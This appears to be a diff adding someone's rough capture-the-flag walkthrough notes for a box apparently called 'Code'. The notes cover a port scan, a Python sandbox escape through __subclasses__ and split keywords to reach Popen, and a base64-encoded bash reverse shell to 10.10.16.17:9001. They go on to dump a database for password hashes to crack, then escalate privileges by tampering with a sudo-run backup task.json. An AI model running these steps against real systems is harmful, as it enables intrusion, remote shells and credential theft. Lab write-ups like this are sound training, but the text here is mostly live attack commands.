@@ -1,0 +1,123 @@
+nmap -sV -sC -vv -oA nmap/Code ip addres
+
+go to the ipaddress:5000
+
+try running 
+
+import os 
+os.system("id")
+
+try to include files using 
+with open("etc/passwd,'r') as f:
+    f.readlines()
+
+commented out lines 11 and 12 and added line
+print("test)
+
+we got the same restriction error, so its blocking the text in general
+
+trying to print different key words to see what is allowed and whats not allowed 
+print with, import, open, os
+
+can try with case sensitivity as well
+
+google python sandbox evasion cheatsheet
+
+try hacktricks 
+try using print([].__class__.__base__.__subclasses__())
+
+we can turn it into a for loop to find where a dangerous class
+
+for c in [].__class__.__base__.__subclasses__():
+    print(c.__name__.lower())
+
+
+
+i = 0
+for c in [].__class__.__base__.__subclasses__():
+    if c.__name__.lower() =="system":
+        print(str(i)+ " " + c.__name__.lower())
+    i+=1
+
+we can break up system into parts and when we run it python will add them back together 
+i = 0
+for c in [].__class__.__base__.__subclasses__():
+    if c.__name__.lower() =='sy'+'st'+'em':
+        print(str(i)+ " " + c.__name__.lower())
+    i+=1
+
+
+i = 0
+for c in [].__class__.__base__.__subclasses__():
+    if c.__name__.lower() =='p'+'op'+'en':
+        print(str(i)+ " " + c.__name__.lower())
+    i+=1
+
+popen does come back and its at number 0, 
+
+[].__class__.__base__.__subclasses__()[0](['ping', '-c', '1', '10.10.16.17' ])
+
+start a tcp dump 
+
+sudo tcpdump -i tun0 icmp
+
+
+start a nc listener
+
+nc -lvnp 9001 
+
+get rid of special characters such as +, so add an extra space 
+echo -n 'bash -i  >& /dev/tcp/10.10.16.17/9001 0>&1' | base64 -w 0 ;echo
+
+we will place the one liner script like this 
+
+[].__class__.__base__.__subclasses__()[317](['bash','-c','echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTcvOTAwMSAwPiYx | base64 -d | bash'])
+
+could also do a reverseshell one liner like this 
+[x for x in [].__class__.__base__.__subclasses__() if x.__name__.lower() == 'p'+'op'+'en'][0](['bash','-c','echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTcvOTAwMSAwPiYx | base64 -d | bash'])
+
+
+once we get a reverse shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")
+CTRL+z
+
+stty raw -echo;fg
+
+enter *2
+
+export TERM=xterm-256color
+
+
+once logged in, cat app.py and look for database location and username/password
+
+to find databases.db do "find . -type f"
+
+go to database location
+
+sqlite3 datbase.db .dump
+
+either user hashcat or crackstation
+
+
+to find users 
+cat /etc/passwd | grep sh$
+
+ssh to martin
+
+cd backup directory
+
+do sudo -l 
+
+copy the task.json to /dev/shm
+
+cd /dev/shm
+
+paste /usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' task.json
+
+vi task.json
+
+change the directories to archive from 
+to /home/../
+
+do a chmod 777 task.json
